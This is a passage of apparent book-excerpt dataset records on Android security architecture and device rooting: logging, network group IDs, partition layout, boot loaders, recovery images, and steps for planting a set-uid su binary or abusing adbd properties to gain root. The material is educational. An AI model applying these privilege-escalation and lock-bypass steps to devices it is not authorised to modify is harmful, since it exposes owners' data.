adbserver\nUser\nKernel adb logcat\nmain 64KB radio\nlogger 64KB\n/dev/log/main /dev/log/main\n/dev/log/radio event system /dev/log/radio\n/dev/log/event 256KB 64KB /dev/log/event\n/dev/log/system /dev/log/system\nFigure 2-4: Android logging system architecture\nc02.indd 01:14:22:PM 02/24/2014 Page 53\n54 Chapter 2 ■ Android Security Design and Architecture\nThe system buffer is also a source of much information, namely for system-wide\nevents generated by system processes. These processes utilize the println_native\nmethod in the android.util.Slog class. This method in turn calls native code\nspecifi c to logging to this particular buffer.\nLog messages can be retrieved using the logcat command, with both the\nmain and system buffers being the default sources. In the following code, we\nrun adb -d logcat to see what is happening on the attached device:\n$ adb -d logcat\n--------- beginning of /dev/log/system\nD/MobileDataStateTracker( 1600): null: Broadcast received:\nACTION_ANY_DATA_CONNECTION_STATE_CHANGEDmApnType=null != received\napnType=internet\nD/MobileDataStateTracker( 1600): null: Broadcast received:\nACTION_ANY_DATA_CONNECTION_STATE_CHANGEDmApnType=null != received\napnType=internet\nD/MobileDataStateTracker( 1600): httpproxy: Broadcast received:\nACTION_ANY_DATA_CONNECTION_STATE_CHANGEDmApnType=httpproxy != received\napnType=internet\nD/MobileDataStateTracker( 1600): null: Broadcast received:\nACTION_ANY_DATA_CONNECTION_STATE_CHANGEDmApnType=null != received\napnType=internet\n...\n--------- beginning of /dev/log/main\n...\nD/memalloc( 1743): /dev/pmem: Unmapping buffer base:0x5396a000\nsize:12820480 offset:11284480\nD/memalloc( 1743): /dev/pmem: Unmapping buffer base:0x532f8000\nsize:1536000 offset:0\nD/memalloc( 1743): /dev/pmem: Unmapping buffer base:0x546e7000\nsize:3072000 offset:1536000\nD/libEGL ( 4887): loaded /system/lib/egl/libGLESv1_CM_adreno200.so\nD/libEGL ( 4887): loaded /system/lib/egl/libGLESv2_adreno200.so\nI/Adreno200-EGLSUB( 4887): <ConfigWindowMatch:2078>: Format RGBA_8888.\nD/OpenGLRenderer( 4887): Enabling debug mode 0\nV/chromium( 4887): external/chromium/net/host_resolver_helper/host_\nresolver_helper.cc:66: [0204/172737:INFO:host_resolver_helper.cc(66)]\nDNSPreResolver::Init got hostprovider:0x5281d220\nV/chromium( 4887): external/chromium/net/base/host_resolver_impl.cc:1515:\n[0204/172737:INFO:host_resolver_impl.cc(1515)]\nHostResolverImpl::SetPreresolver preresolver:0x013974d8\nV/WebRequest( 4887): WebRequest::WebRequest, setPriority = 0\nI/InputManagerService( 1600): [unbindCurrentClientLocked] Disable input\nmethod client.\nI/InputManagerService( 1600): [startInputLocked] Enable input\nmethod client.\nV/chromium( 4887): external/chromium/net/disk_cache/\nhostres_plugin_bridge.cc:52: [0204/172737:INFO:hostres_\nplugin_bridge.cc(52)] StatHubCreateHostResPlugin initializing...\n...\nc02.indd 01:14:22:PM 02/24/2014 Page 54\nChapter 2 ■ Android Security Design and Architecture 55\nThe logcat command is so commonly executed that ADB actually provides\na shortcut for running it on a target device. Throughout the course of the book,\nwe make extensive use of the logcat command to monitor processes and overall\nsystem state.\nParanoid Networking\nThe Android kernel restricts network operations based on supplementary group\nmembership of the calling process—a kernel modifi cation known as Paranoid\nNetworking. At a high level, this involves mapping an AID, and subsequently\na GID, to an application-level permission declaration or request. For example,\nthe manifest permission android.permission.INTERNET effectively maps to the\nAID_INET AID—or GID 3003. These groups, IDs, and their respective capabilities\nare defi ned in include/linux/android_aid.h in the kernel source tree, and are\ndescribed in Table 2-4.\nTable 2-4: Networking capabilities by group\nAID DEFINITION GROUP ID / NAME CAPABILITY\nAllows for creation of any Bluetooth\nAID_NET_BT_ADMIN 3001 / net_bt_admin socket, as well as diagnoses and\nmanages Bluetooth connections\nAID_NET_BT 3002 / net_bt Allows for creation of SCO, RFCOMM,\nor L2CAP (Bluetooth) sockets\nAID_INET 3003 / inet Allows for creation of AF_INET and\nAF_INET6 sockets\nAID_NET_RAW 3004 / net_raw Allows the use of RAW and PACKET\nsockets\nAID_NET_ADMIN 3005 / net_admin Grants the CAP_NET_ADMIN capability,\nallowing for network interface, routing\ntable, and socket manipulation\nYou can fi nd additional Android-specifi c group IDs in the AOSP source\nrepository in system/core/include/private/android_filesystem_config.h.\nComplex Security, Complex Exploits\nAfter taking a closer look at the design and architecture of Android, it is clear that\nthe Android operating system developers created a very complex system. Their\ndesign allows them to adhere to the principle of least privilege, which states that\nany particular component should have access only to things that it absolutely\nrequires. Throughout this book, you will see substantial evidence of the use of\nthis principle. Although it serves to improve security, it also increases complexity.\nc02.indd 01:14:22:PM 02/24/2014 Page 55\n56 Chapter 2 ■ Android Security Design and Architecture\nProcess isolation and privilege reduction are techniques that are often a\ncornerstone in secure system design. The complexities of these techniques com-\nplicate the system for both developers and attackers, which increase the cost of\ndevelopment for both parties. When an attacker is crafting his attack, he must\ntake the time to fully understand the complexities involved. With a system like\nAndroid, exploiting a single vulnerability may not be enough to get full access\nto the system. Instead, the attacker may have to exploit several vulnerabilities\nto achieve the objective. To summarize, successfully attacking a complex system\nrequires a complex exploit.\nA great real-world example of this concept is the “diaggetroot” exploit used to\nroot the HTC J Butterfl y. To achieve root access, that exploit leveraged multiple,\ncomplementary issues. That particular exploit is discussed in further detail in\nChapter 3.\nSummary\nThis chapter gave an overview of the security design and architecture of Android.\nWe introduced the Android sandbox and the permissions models used by\nAndroid. This included Android’s special implementation of Unix UID/GID\nmappings (AIDs), as well as the restrictions and capabilities enforced through-\nout the system.\nWe also covered the logical layers of Android, including applications, the\nAndroid Framework, the DalvikVM, user-space native code, and the Linux\nkernel. For each of these layers, we discussed key components, especially those\nthat are security related. We highlighted important additions and modifi cations\nthat the Android developers made to the Linux kernel.\nThis fairly high-level coverage of Android’s overall design helps frame the\nremaining chapters, which dive even further into the components and layers\nintroduced in this chapter.\nThe next chapter explains the how and why of taking full control of your\nAndroid device. It discusses several generic methods for doing so as well as\nsome past techniques that rely on specifi c vulnerabilities.\nc02.indd 01:14:22:PM 02/24/2014 Page 56"
  },
  {
    "input": "What are the key reasons someone might want to root an Android device and what are the potential security risks associated with the process?",
    "summary": "Rooting an Android device grants super user access, allowing full control over the system and enabling tasks like system modifications and uninstalling pre-installed apps. However, rooting can compromise device security by exposing user data and potentially leaving it vulnerable to unauthorized access. This chapter explains the general rooting process, the importance of understanding the device's partition layout, and the security risks involved.",
    "output": "CHAPTER\n3\nRooting Your Device\nThe process of gaining super user privileges on an Android device is commonly\ncalled rooting. The system super user account is ubiquitously called root, hence the\nterm rooting. This special account has rights and permissions over all fi les and\nprograms on a UNIX-based system. It has full control over the operating system.\nThere are many reasons why someone would like to achieve administrative\nprivileges on an Android device. For the purposes of this book, our primary\nreason is to audit the security of an Android device without being confi ned\nby UNIX permissions. However, some people want to access or alter system\nfi les to change a hard-coded confi guration or behavior, or to modify the look\nand feel with custom themes or boot animations. Rooting also enables users\nto uninstall pre-installed applications, do full system backups and restores,\nor load custom kernel images and modules. Also, a whole class of apps exists\nthat require root permissions to run. These are typically called root apps and\ninclude programs such as iptables-based fi rewalls, ad-blockers, overclocking,\nor tethering applications.\nRegardless of your reason to root, you should be concerned that the process\nof rooting compromises the security of your device. One reason is that all\nuser data is exposed to applications that have been granted root permissions.\nFurther, it could leave an open door for someone to extract all user data from\nthe device if you lose it or it is stolen, especially if security mechanisms (such\nas boot loader locks, or signed recovery updates) have been removed while\nrooting it.\n57\nc03.indd 12:15:57:PM 03/04/2014 Page 57\n58 Chapter 3 ■ Rooting Your Device\nThis chapter covers the process of rooting an Android device in a generic\nway, without giving specifi c details about a concrete Android version or device\nmodel. It also explains the security implications of each step performed to gain\nroot. Finally, the chapter provides an overview of some fl aws that have been\nused for rooting Android devices in the past. These fl aws have been fi xed in\ncurrent Android releases.\nWARNING Rooting your device, if you do not know what you are doing, can\ncause your phone to stop functioning correctly. This is especially true if you modify\nany system fi les. Thankfully, most Android devices can be returned to the stock fac-\ntory state if needed.\nUnderstanding the Partition Layout\nPartitions are logical storage units or divisions made inside the device’s\npersistent storage memory. The layout refers to the order, offsets, and sizes of\nthe various partitions. The partition layout is handled by the boot loader in most\ndevices, although in some rare cases it can also be handled by the kernel itself.\nThis low-level storage partitioning is crucial to proper device functionality.\nThe partition layout varies between vendors and platforms. Two different\ndevices typically do not have the same partitions or the same layout. However,\na few partitions are present in all Android devices. The most common of these\nare the boot, system, data, recovery, and cache partitions. Generally speaking, the\ndevice’s NAND fl ash memory is partitioned using the following partition layout:\n■ boot loader: Stores the phone’s boot loader program, which takes care\nof initializing the hardware when the phone boots, booting the Android\nkernel, and implementing alternative boot modes such as download mode.\n■ splash: Stores the fi rst splash screen image seen right after powering on\nthe device. This usually contains the manufacturer’s or operator’s logo.\nOn some devices, the splash screen bitmap is embedded inside the boot\nloader itself rather than being stored in a separate partition.\n■ boot: Stores the Android boot image, which consists of a Linux kernel\n(zImage) and the root fi le system ram disk (initrd).\n■ recovery: Stores a minimal Android boot image that provides maintenance\nfunctions and serves as a failsafe.\n■ system: Stores the Android system image that is mounted as /system on\na device. This image contains the Android framework, libraries, system\nbinaries, and pre-installed applications.\n■ userdata: Also called the data partition, this is the device’s internal stor-\nage for application data and user fi les such as pictures, videos, audio, and\ndownloads. This is mounted as /data on a booted system.\nc03.indd 12:15:57:PM 03/04/2014 Page 58\nChapter 3 ■ Rooting Your Device 59\n■ cache: Used to store various utility fi les such as recovery logs and update\npackages downloaded over-the-air. On devices with applications installed\non an SD card, it may also contain the dalvik-cache folder, which stores\nthe Dalvik Virtual Machine (VM) cache.\n■ radio: A partition that stores the baseband image. This partition is usually\npresent only on devices with telephony capabilities.\nDetermining the Partition Layout\nYou can obtain the partition layout of a particular device in several ways. First,\nyou can look at the contents of the partitions entry in the /proc fi le system.\nFollowing are the contents of this entry on a Samsung Galaxy Nexus running\nAndroid 4.2.1:\nshell@android:/data $ cat /proc/partitions\nmajor minor #blocks name\n31 0 1024 mtdblock0\n179 0 15388672 mmcblk0\n179 1 128 mmcblk0p1\n179 2 3584 mmcblk0p2\n179 3 20480 mmcblk0p3\n179 4 8192 mmcblk0p4\n179 5 4096 mmcblk0p5\n179 6 4096 mmcblk0p6\n179 7 8192 mmcblk0p7\n259 0 12224 mmcblk0p8\n259 1 16384 mmcblk0p9\n259 2 669696 mmcblk0p10\n259 3 442368 mmcblk0p11\n259 4 14198767 mmcblk0p12\n259 5 64 mmcblk0p13\n179 16 512 mmcblk0boot1\n179 8 512 mmcblk0boot0\nIn addition to the proc entry, it is also possible to get a mapping of these device\nfi les to their logical functions. To do this, check the contents of the System-on-\nChip (SoC) specifi c directory in /dev/block/platform. There, you should fi nd a\ndirectory called by-name, where each partition name is linked to its correspond-\ning block device. The following excerpt shows the contents of this directory on\nthe same Samsung Galaxy Nexus as the previous example.\nshell@android:/dev/block/platform/omap/omap_hsmmc.0/by-name $ ls -l\nlrwxrwxrwx root root 2013-01-30 20:43 boot -> /dev/block/mmcblk0p7\nlrwxrwxrwx root root 2013-01-30 20:43 cache -> /dev/block/mmcblk0p11\nlrwxrwxrwx root root 2013-01-30 20:43 dgs -> /dev/block/mmcblk0p6\nlrwxrwxrwx root root 2013-01-30 20:43 efs -> /dev/block/mmcblk0p3\nlrwxrwxrwx root root 2013-01-30 20:43 metadata -> /dev/block/mmcblk0p13\nlrwxrwxrwx root root 2013-01-30 20:43 misc -> /dev/block/mmcblk0p5\nlrwxrwxrwx root root 2013-01-30 20:43 param -> /dev/block/mmcblk0p4\nc03.indd 12:15:57:PM 03/04/2014 Page 59"
  },
  {
    "input": "What are the different methods for rooting an Android device, including both scenarios with an unlocked boot loader and those with a locked boot loader?",
    "summary": "This chapter explains how to root an Android device, covering both unlocked and locked boot loader scenarios. It details the boot process, partition layout, recovery modes, and various root exploits, including methods to gain and maintain root access. The text also discusses security implications of rooting and provides examples of known vulnerabilities and exploits that have been used to achieve root access on different Android devices.",
    "output": "60 Chapter 3 ■ Rooting Your Device\nlrwxrwxrwx root root 2013-01-30 20:43 radio -> /dev/block/mmcblk0p9\nlrwxrwxrwx root root 2013-01-30 20:43 recovery -> /dev/block/mmcblk0p8\nlrwxrwxrwx root root 2013-01-30 20:43 sbl -> /dev/block/mmcblk0p2\nlrwxrwxrwx root root 2013-01-30 20:43 system -> /dev/block/mmcblk0p10\nlrwxrwxrwx root root 2013-01-30 20:43 userdata -> /dev/block/mmcblk0p12\nlrwxrwxrwx root root 2013-01-30 20:43 xloader -> /dev/block/mmcblk0p1\nFurther still, there are other places where you can obtain information about\nthe partition layout. The /etc/vold.fstab fi le, the recovery log (/cache/\nrecovery/last_log), and the kernel logs (via dmesg or /proc/kmsg) are known\nto contain partition layout information in some cases. If all else fails, you can\nfi nd some information about partitions using the mount command or examin-\ning /proc/mounts.\nUnderstanding the Boot Process\nThe boot loader is usually the fi rst thing that runs when the hardware is powered\non. On most devices, the boot loader is manufacturer’s proprietary code that\ntakes care of low-level hardware initialization (setup clocks, internal RAM, boot\nmedia, and so on) and provides support for loading recovery images or putting\nthe phone into download mode. The boot loader itself is usually comprised of\nmultiple stages, but we only consider it as a whole here.\nWhen the boot loader has fi nished initializing the hardware it loads the\nAndroid kernel and initrd from the boot partition into RAM. Finally, it jumps\ninto the kernel to let it continue the boot process.\nThe Android kernel does all the tasks needed for the Android system to run\nproperly on the device. For example, it will initialize memory, input/output\n(I/O) areas, memory protections, interrupt handlers, the CPU scheduler, device\ndrivers, and so on. Finally, it mounts the root fi le system and starts the fi rst\nuser-space process, init.\nThe init process is the father of all other user-space processes. When it\nstarts, the root fi le system from the initrd is still mounted read/write. The\n/init.rc script serves as the confi guration fi le for init. It specifi es the actions\nto take while initializing the operating system’s user-space components. This\nincludes starting some core Android services such as rild for telephony, mtpd\nfor VPN access, and the Android Debug Bridge daemon (adbd). One of the\nservices, Zygote, creates the Dalvik VM and starts the fi rst Java component,\nSystem Server. Finally, other Android Framework services, such as the Telephony\nManager, are started.\nThe following shows an excerpt from the init.rc script of an LG Optimus\nElite (VM696). You can fi nd more information about the format of this fi le in\nc03.indd 12:15:57:PM 03/04/2014 Page 60\nChapter 3 ■ Rooting Your Device 61\nthe system/core/init/readme.txt fi le from the Android Open Source Project\n(AOSP) repository.\n[...]\nservice adbd /sbin/adbd\ndisabled\n[...]\nservice ril-daemon /system/bin/rild\nsocket rild stream 660 root radio\nsocket rild-debug stream 660 radio system\nuser root\ngroup radio cache inet misc audio sdcard_rw qcom_oncrpc diag\n[...]\nservice zygote /system/bin/app_process -Xzygote\n/system/bin --zygote --start-system-server\nsocket zygote stream 660 root system\nonrestart write /sys/android_power/request_state wake\nonrestart write /sys/power/state on\nonrestart restart media\nonrestart restart netd\n[...]\nWhen the system boot has been completed, an ACTION_BOOT _COMPLETED\nevent is broadcasted to all applications that have registered to receive this broad-\ncast intent in their manifest. When this is complete, the system is considered\nfully booted.\nAccessing Download Mode\nIn the boot process description, we mentioned that the boot loader usually pro-\nvides support for putting the phone into download mode. This mode enables the\nuser to update the persistent storage at a low level through a process typically\ncalled fl ashing. Depending on the device, fl ashing might be available via fastboot\nprotocol, a proprietary protocol, or even both. For example, the Samsung Galaxy\nNexus supports both the proprietary ODIN mode and fastboot.\nNOTE Fastboot is the standard Android protocol for fl ashing full disk images to\nspecifi c partitions over USB. The fastboot client utility is a command-line tool that you\ncan obtain from the Android Software Development Kit (SDK) available at https://\ndeveloper.android.com/sdk/ or the AOSP repository.\nEntering alternate modes, such as download mode, depends on the boot\nloader. When certain key-press combinations are held during boot, the\nboot loader starts download mode instead of doing the normal Android\nkernel boot process. The exact key-press combination varies from device to\nc03.indd 12:15:57:PM 03/04/2014 Page 61\n62 Chapter 3 ■ Rooting Your Device\ndevice, but you can usually easily fi nd it online. After it’s in download mode,\nthe device should await a host PC connection through Universal Serial Bus\n(USB). Figure 3-1 shows the fastboot and ODIN mode screens.\nFigure 3-1: Fastboot and ODIN mode\nWhen a USB connection has been established between the boot loader and\nthe host computer, communication takes place using the device-supported\ndownload protocol. These protocols facilitate executing various tasks including\nfl ashing NAND partitions, rebooting the device, downloading and executing\nan alternate kernel image, and so on.\nLocked and Unlocked Boot Loaders\nGenerally speaking, locked boot loaders prevent the end user from performing\nmodifi cations to the device’s fi rmware by implementing restrictions at the boot\nloader level. Those restrictions can vary, depending on the manufacturer’s deci-\nsion, but usually there is a cryptographic signature verifi cation that prevents\nbooting and/or fl ashing unsigned code to the device. Some devices, such as\ncheap Chinese Android devices, do not include any boot loader restrictions.\nOn Google Nexus devices, the boot loader is locked by default. However,\nthere’s an offi cial mechanism in place that enables owners to unlock it. If the\nend user decides to run a custom kernel, recovery image, or operating system\nc03.indd 12:15:57:PM 03/04/2014 Page 62\nChapter 3 ■ Rooting Your Device 63\nimage, the boot loader needs to be unlocked fi rst. For these devices, unlocking\nthe boot loader is as simple as putting the device into fastboot mode and running\nthe command fastboot oem unlock. This requires the command-line fastboot\nclient utility, which is available in the Android SDK or the AOSP repository.\nSome manufacturers also support unlocking the boot loaders on their devices,\non a per-device basis. In some cases the process uses the standard Original\nEquipment Manufacturer (OEM) unlock procedure through fastboot. However,\nsome cases revolve around some proprietary mechanism such as a website or\nunlock portal. These portals usually require the owner to register his device, and\nforfeit his warranty, to be able to unlock its boot loader. As of this writing, HTC,\nMotorola, and Sony support unlocking at least some of their devices.\nUnlocking the boot loader carries serious security implications. If the device is\nlost or stolen, all data on it can be recovered by an attacker simply by uploading\na custom Android boot image or fl ashing a custom recovery image. After doing\nso, the attacker has full access to the data contained on the device’s partitions.\nThis includes Google accounts, documents, contacts, stored passwords, appli-\ncation data, camera pictures, and more. Because of this, a factory data reset is\nperformed on the phone when unlocking a locked boot loader. This ensures all\nthe end user’s data are erased and the attacker should not be able to access it.\nWARNING We highly recommended using Android device encryption. Even after\nall data has been erased, it is possible to forensically recover erased data on some\ndevices.\nStock and Custom Recovery Images\nThe Android recovery system is Android’s standard mechanism that allows\nsoftware updates to replace the entirety of the system software preinstalled on\nthe device without wiping user data. It is mainly used to apply updates down-\nloaded manually or Over-the-Air (OTA). Such updates are applied offl ine after\na reboot. In addition to applying OTA updates, the recovery can perform other\ntasks such as wiping the user data and cache partitions.\nThe recovery image is stored on the recovery partition, and consists of a mini-\nmal Linux image with a simple user interface controlled by hardware buttons.\nThe stock Android recovery is intentionally very limited in functionality. It\ndoes the minimal things necessary to comply with the Android Compatibility\nDefi nitions at http://source.android.com/compatibility/index.html.\nSimilar to accessing download mode, you access the recovery by pressing a\ncertain key-press combination when booting the device. In addition to using\nkey-presses, it is possible to instruct a booted Android system to reboot into\nrecovery mode through the command adb reboot recovery. The command-\nline Android Debug Bridge (ADB) tool is available as part of the Android SDK\nor AOSP repository at http://developer.android.com/sdk/index.html.\nc03.indd 12:15:57:PM 03/04/2014 Page 63\n64 Chapter 3 ■ Rooting Your Device\nOne of the most commonly used features of the recovery is to apply an update\npackage. Such a package consists of a zip fi le containing a set of fi les to be cop-\nied to the device, some metadata, and an updater script. This updater script\ntells the Android recovery which operations to perform on the device to apply\nthe update modifi cations. This could include mounting the system partition,\nmaking sure the device and operating system versions match with the one the\nupdate package was created for, verifying SHA1 hashes of the system fi les that\nare going to be replaced, and so on. Updates are cryptographically signed using\nan RSA private key. The recovery verifi es the signature using the correspond-\ning public key prior to applying the update. This ensures only authenticated\nupdates can be applied. The following snippet shows the contents of a typical\nOver-the-Air (OTA) update package.\nExtracting an OTA Update Package for Nexus 4\n$ unzip 625f5f7c6524.signed-occam-JOP40D-from-JOP40C.625f5f7c.zip\nArchive: 625f5f7c6524.signed-occam-JOP40D-from-JOP40C.625f5f7c.zip\nsigned by SignApk\ninflating: META-INF/com/android/metadata\ninflating: META-INF/com/google/android/update-binary\ninflating: META-INF/com/google/android/updater-script\ninflating: patch/system/app/ApplicationsProvider.apk.p\ninflating: patch/system/app/ApplicationsProvider.odex.p\ninflating: patch/system/app/BackupRestoreConfirmation.apk.p\ninflating: patch/system/app/BackupRestoreConfirmation.odex.p\n[...]\ninflating: patch/system/lib/libwebcore.so.p\ninflating: patch/system/lib/libwebrtc_audio_preprocessing.so.p\ninflating: recovery/etc/install-recovery.sh\ninflating: recovery/recovery-from-boot.p\ninflating: META-INF/com/android/otacert\ninflating: META-INF/MANIFEST.MF\ninflating: META-INF/CERT.SF\ninflating: META-INF/CERT.RSA\nCustom Android recovery images exist for most devices. If one is not available,\nyou can easily create it by applying custom modifi cations to the stock Android\nrecovery source code from the AOSP repository.\nThe most common modifi cations included in custom recovery images are\n■ Including a full backup and restore functionality (such as NANDroid script)\n■ Allow unsigned update packages, or allow signed packages with custom\nkeys\n■ Selectively mounting device partitions or SD card\n■ Provide USB mass storage access to SD card or data partitions\nc03.indd 12:15:57:PM 03/04/2014 Page 64\nChapter 3 ■ Rooting Your Device 65\n■ Provide full ADB access, with the ADB daemon running as root\n■ Include a fully featured BusyBox binary\nPopular custom recovery images with builds for multiple devices are\nClockworkMod recovery or TeamWin Recovery Project (TWRP). Figure 3-2\nshows stock and ClockworkMod recovery screens.\nFigure 3-2: Android recovery and ClockworkMod Recovery\nWARNING Keeping a custom recovery image with signature restrictions\nremoved, or full ADB access exposed, on your Android device also leaves an open door\nto obtaining all user data contained on the device’s partitions.\nRooting with an Unlocked Boot Loader\nThe process of rooting culminates in having an su binary with the proper set-uid\npermissions on the system partition. This allows elevating privileges whenever\nneeded. The su binary is usually accompanied by an Android application, such\nas SuperUser or SuperSU, that provides a graphical prompt each time an appli-\ncation requests root access. If the request is granted, the application invokes\nthe su binary to execute the requested command. These su wrapper Android\nc03.indd 12:15:57:PM 03/04/2014 Page 65\n66 Chapter 3 ■ Rooting Your Device\napplications also manage which applications or users should be granted root\naccess automatically, without prompting the user.\nNOTE The latest version of Chainfi re SuperSU can be downloaded as a recov-\nery update package from http://download.chainfire.eu/supersu or as a\nstandalone application from Google Play at https://play.google.com/store/\napps/details?id=eu.chainfire.supersu.\nThe ClockworkMod SuperUser package can be obtained from Google Play at\nhttps://play.google.com/store/apps/details?id=com\n.koushikdutta.superuser. The source code is available at https://github\n.com/koush/Superuser.\nOn devices with an unlocked or unlockable boot loader, gaining root access is\nvery easy, as you do not have to rely on exploiting an unpatched security hole.\nThe fi rst step is to unlock the boot loader. If you haven’t done it already, depend-\ning on the device you should either use fastboot oem unlock as described in\nthe “Locked and Unlocked Boot Loaders” section, or use a vendor-specifi c boot\nloader unlock tool to legitimately unlock the device.\nAt the time of this writing, Motorola, HTC, and Sony-Ericsson support boot\nloader unlocking on some devices through their unlock portal websites.\nNOTE The boot loader unlock portal for Motorola is available at https://\nmotorola-global-portal.custhelp.com/app/standalone/bootloader/\nunlock-your-device-a.\nThe boot loader unlock portal for HTC is available at http://www.htcdev.com/\nbootloader.\nThe boot loader unlock portal for SonyEricsson is available at http://\nunlockbootloader.sonymobile.com/.\nWhen the boot loader is unlocked, the user is free to make custom mod-\nifi cations to the device. At this point, there are several ways to include the\nappropriate su binary for the device’s architecture in the system partition, with\nthe correct permissions.\nYou can modify a factory image to add an su binary. In this example, we unpack\nan ext4 formatted system image, mount it, add an su binary, and repack it. If\nwe fl ash this image, it will contain the su binary and the device will be rooted.\nmkdir systemdir\nsimg2img system.img system.raw\nmount -t ext4 -o loop system.raw systemdir\ncp su systemdir/xbin/su\nchown 0:0 systemdir/xbin/su\nchmod 6755 systemdir/xbin/su\nmake_ext4fs -s -l 512M -a system custom-system.img systemdir\numount systemdir\nc03.indd 12:15:57:PM 03/04/2014 Page 66\nChapter 3 ■ Rooting Your Device 67\nIf the device is an AOSP-supported device, you can compile a userdebug or\neng Android build from source. Visit http://source.android.com/source/\nbuilding.html for more information on building Android from source. These\nbuild confi gurations provide root access by default:\ncurl http://commondatastorage.googleapis.com/git-repo-downloads/repo \\\n-o ~/bin/repo\nchmod a+x ~/bin/repo\nrepo init -u https://android.googlesource.com/platform/manifest\nrepo sync\nsource build/envsetup.sh\nlunch full_maguro-userdebug\nWhether you built your custom system image by modifying a factory image\nor by compiling your own, you must fl ash the system partition for it to take\neffect. For example, the following command shows how to fl ash this image\nusing the fastboot protocol:\nfastboot flash system custom-system.img\nThe most straightforward method is to boot a custom recovery image. This\nallows copying the su binary into the system partition and setting the appropri-\nate permissions through a custom update package.\nNOTE When using this method, you are booting the custom recovery image with-\nout fl ashing it, so you use it only to fl ash an su binary on the system partition without\nmodifying the recovery partition at all.\nTo do this, download a custom recovery image and su update package. The\ncustom recovery image can be one of your choosing, as long as it supports your\ndevice. Similarly, the su update package can be SuperSU, SuperUser, or another\nof your choice.\n1. You should place both downloads into the device’s storage, typically on\nthe SD card mounted as /sdcard.\n2. Next, put the device into fastboot mode.\n3. Now, open a command prompt, and type fastboot boot recovery.img,\nwhere recovery.img is the raw recovery image you downloaded.\n4. From the recovery menu, select the option to apply an update zip fi le and\nbrowse to the folder on your device storage where you have placed the\nupdate package with the su binary.\nAdditionally, devices using Android 4.1 or later contain a new feature called\nsideload. This feature allows applying an update zip over ADB without copy-\ning it to the device beforehand. To sideload an update, run the command adb\nsideload su-package.zip, where su-package.zip is the fi lename of the update\npackage on your computer’s hard drive.\nc03.indd 12:15:57:PM 03/04/2014 Page 67\n68 Chapter 3 ■ Rooting Your Device\nAfter unlocking the boot loader on some devices, you can boot unsigned\ncode but you can’t fl ash unsigned code. In this case, fl ashing a custom system\nor recovery image is only possible after gaining root on the booted system. In\nthis scenario, you would use dd to write a custom recovery image directly to\nthe block device for the recovery partition.\nRooting with a Locked Boot Loader\nWhen the boot loader is locked, and the manufacturer doesn’t provide a legiti-\nmate method to unlock it, you usually need to fi nd a fl aw in the device that will\nserve as an entry point for rooting it.\nFirst you need to identify which type of boot loader lock you have; it can\nvary depending on the manufacturer, carrier, device variant, or software ver-\nsion within the same device. Sometimes, fastboot access is forbidden but you\ncan still fl ash using the manufacturer’s proprietary fl ashing protocol, such as\nMotorola SBF or Samsung ODIN. Sometimes signature checks on the same\ndevice are enforced differently when using fastboot instead of the manufac-\nturer’s proprietary download mode. Signature checking can happen at boot\ntime, at fl ashing time, or both.\nSome locked boot loaders only enforce signature verifi cation on selected\npartitions; a typical example is having locked boot and recovery partitions. In\nthis case booting a custom kernel or a modifi ed recovery image is not allowed,\nbut you can still modify the system partition. In this scenario, you can perform\nrooting by editing the system partition of a stock image as described in the\n“Rooting with an Unlocked Boot Loader” section.\nOn some devices, where the boot partition is locked and booting a custom\nkernel is forbidden, it is possible to fl ash a custom boot image in the recovery\npartition and boot the system with the custom kernel by booting in recovery\nmode when powering on the phone. In this case, it is possible to get root access\nthrough adb shell by modifying the default.prop fi le of the custom boot\nimage initrd, as you’ll see in the “Abusing adbd to Get Root” section. On some\ndevices, the stock recovery image allows applying updates signed with the default\nAndroid test key. This key is a generic key for packages that do not otherwise\nspecify a key. It is included in the build/target/product/security directory\nin the AOSP source tree. You can root by applying a custom update package\ncontaining the su binary. It is unknown whether the manufacturer has left this\non purpose or not, but this is known to work on some Samsung devices with\nAndroid 4.0 and stock recovery 3e.\nIn the worst-case scenario, boot loader restrictions won’t allow you to boot\nwith a partition that fails signature verifi cation. In this case, you have to use\nc03.indd 12:15:57:PM 03/04/2014 Page 68\nChapter 3 ■ Rooting Your Device 69\nother techniques to achieve root access, as described in the “Gaining Root on\na Booted System” section.\nGaining Root on a Booted System\nGaining initial root access on a booted system consists of getting a root shell\nthrough an unpatched security fl aw in the Android operating system. A root-\ning method like this is also widely known as a soft root because the attack is\nalmost entirely software based. Usually, a soft root is accomplished through a\nvulnerability in the Android kernel, a process running as root, a vulnerable\nprogram with the set-uid bit set, a symbolic link attack against a fi le permission\nbug, or other issues. There are a vast number of possibilities due to the sheer\nnumber of areas in which issues could be introduced and types of mistakes\nprogrammers could make.\nAlthough root set-uid or set-gid binaries are not common in stock Android,\ncarriers or device manufacturers sometimes introduce them as part of their\ncustom modifi cations. A typical security fl aw in any of these set-uid binaries\ncan lead to privilege escalation and subsequently yield root access.\nAnother typical scenario is exploiting a security vulnerability in a process\nrunning with root privileges. Such an exploit enables you to execute arbitrary\ncode as root. The end of this chapter includes some examples of this.\nAs you will see in Chapter 12, these exploits are becoming more diffi cult to\ndevelop as Android matures. New mitigation techniques and security harden-\ning features are regularly introduced with new Android releases.\nAbusing adbd to Get Root\nIt is important to understand that the adbd daemon will start running as root\nand drop its privileges to the shell user (AID_SHELL) unless the system property\nro.secure is set to 0. This property is read-only and is usually set to ro.secure=1\nby the boot image initrd.\nThe adbd daemon will also start as root without dropping privileges to shell\nif the property ro.kernel.qemu is set to 1 (to start adbd running as root on the\nAndroid emulator), but this is also a read-only property that will not normally\nbe set on a real device.\nAndroid versions before 4.2 will read the /data/local.prop fi le on boot and\napply any properties set in this fi le. As of Android 4.2 this fi le will only be read\non non-user builds, if ro.debuggable is set to 1.\nThe /data/local.prop fi le and the ro.secure and ro.kernel.qemu proper-\nties are of key importance for gaining root access. Keep those in mind, as you\nwill see some exploits using them in the “History of Known Attacks” section\nlater in this chapter.\nc03.indd 12:15:57:PM 03/04/2014 Page 69\n70 Chapter 3 ■ Rooting Your Device\nNAND Locks, Temporary Root, and Permanent Root\nSome HTC devices have a security fl ag (@secuflag) in the radio Non-Volatile\nRandom Access Memory (NVRAM) which is checked by the device boot loader\n(HBOOT). When this fl ag is set to “true” the boot loader displays a “security\non” message (S-ON) and a NAND lock is enforced. The NAND lock prevents\nwriting to the system, boot, and recovery partitions. With S-ON, a reboot loses\nroot, and writes on these partitions won’t stick. This makes custom system\nROMs, custom kernels, and custom recovery modifi cations impossible.\nIt is still possible to gain root access through an exploit for a suffi ciently severe\nvulnerability. However, the NAND lock causes any changes to be lost on reboot.\nThis is known as a temporary root in the Android modding community.\nTo achieve a permanent root on HTC devices with a NAND lock, one of two\nthings must be done. First, you can disable the security fl ag in the baseband.\nSecond, you can fl ash the device with a patched 